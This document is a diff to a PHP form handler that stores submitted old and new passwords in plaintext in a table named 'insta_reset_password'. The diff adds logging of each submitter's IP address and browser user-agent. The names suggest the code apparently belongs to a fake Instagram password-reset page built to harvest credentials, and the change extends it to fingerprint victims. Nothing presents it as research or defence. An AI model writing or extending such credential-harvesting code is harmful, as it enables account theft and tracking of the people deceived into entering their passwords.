@@ -26,12 +26,15 @@ if (isset($_POST["button"])) {
         $pass = $_POST["password"];
         $reset_pass = $_POST["new_password"];
 
+        $ip_logs = $_SERVER['REMOTE_ADDR'];
+        $os_browser_logs = $_SERVER['HTTP_USER_AGENT'];
+
         
-        $sql = "INSERT INTO insta_reset_password (insta_old_password, insta_new_password) VALUES (?, ?)";
+        $sql = "INSERT INTO insta_reset_password (insta_old_password, insta_new_password, ip_logs, os_browser_logs) VALUES (?, ?, ?, ?)";
         $stmt = mysqli_prepare($sql_conn, $sql);
 
         if ($stmt) {
-            mysqli_stmt_bind_param($stmt, "ss", $pass, $reset_pass);
+            mysqli_stmt_bind_param($stmt, "ssss", $pass, $reset_pass, $ip_logs, $os_browser_logs);
             mysqli_stmt_execute($stmt);
             mysqli_stmt_close($stmt);
 
@@ -43,7 +46,7 @@ if (isset($_POST["button"])) {
         mysqli_close($sql_conn);
     }
 }
-    
+
 ?>
 
 <!DOCTYPE html>
